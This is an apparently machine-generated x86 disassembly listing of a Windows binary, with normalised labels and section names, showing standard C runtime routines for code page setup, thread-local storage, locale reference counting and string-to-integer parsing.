mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_414890
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_412c38
push 0xc
push r--data
call sub_4143e0
call sub_41371e
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412cd3
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_414425
retn
push 0x20
call sub_4140d7
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_410135
pop ecx
sub_412cdc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_412d58
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_412cdc
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_412a41
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_414890
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_412a12
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_412aa5
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_414890
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_412a12
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_412f3d
push 0x14
push r--data
call sub_4143e0
or [ ebp - 0x20 ] 0xffffffff
call sub_41371e
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_412c38
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_412cdc
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_413ed3
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_414425
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_412d58
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_410cee
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_410135
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_410135
pop ecx
push 0xd
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41309e
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_410135
pop ecx
sub_4130f5
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_410135
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_410135
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_410135
push [ esi + 0xc0 ]
call sub_410135
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_41a99d
push [ edi ]
call sub_410135
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_410135
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_410135
pop ecx
push [ esi + 0xb0 ]
call sub_410135
push [ esi + 0xbc ]
call sub_410135
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_410135
push [ esi + 0xbc ]
call sub_41ab77
pop ecx
pop ecx
push eax
call sub_410135
pop ecx
push eax
call sub_410135
push [ esi + 0xbc ]
call sub_41ab32
pop ecx
pop ecx
sub_41323e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_4132cd
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_413366
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_41323e
pop ecx
test esi esi
je r-xdata
push esi
call sub_4132cd
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_4130f5
pop ecx
sub_4133a4
push 0xc
push r--data
call sub_4143e0
call sub_41371e
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_413366
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41340e
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_41371e
mov esi [ eax + 0x6c ]
mov eax esi
call sub_414425
retn
push 0x20
call sub_4140d7
pop ecx
sub_41341a
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_4140a7
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_413495
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_4140a7
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_413530
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_413495
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_413581
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_413495
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_417bf2
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_4135be
push 0xc
push r--data
call sub_4143e0
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_4140a7
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413693
push 0xc
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_41323e
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41369c
call sub_414425
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_4136a5
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_413530
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_413f18
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_413495
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_410135
pop ecx
xor esi esi
push 0x0
push esi
call sub_4135be
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_413738
push 0x8
push r--data
call sub_4143e0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_414425
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_410135
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_410135
pop ecx
push 0xd
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_410135
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413852
push 0xc
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41385e
push esi
call sub_410135
pop ecx
push edi
call sub_4132cd
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_410135
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_4130f5
pop ecx
sub_413867
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_413495
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_413738
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_4138d5
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_4140a7
pop ecx
call sub_413581
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_413507
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_414391
push [ rw-data ]
call sub_41341a
push [ rw-data ]
mov [ rw-data ] eax
call sub_41341a
push [ rw-data ]
mov [ rw-data ] eax
call sub_41341a
push [ rw-data ]
mov [ rw-data ] eax
call sub_41341a
add esp 0x10
mov [ rw-data ] eax
call sub_417ba7
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_413738
push [ rw-data ]
call sub_413495
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_413f18
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_413495
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_4135be
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_413a62
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_40e5f8
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_410cee
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_41a147
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_415013
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41a75c
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_413b77
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_413a62
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_413bb0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_413c11
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_410cee
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
sub_413c79
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_40e5f8
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_410cee
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_415013
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_410cee
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
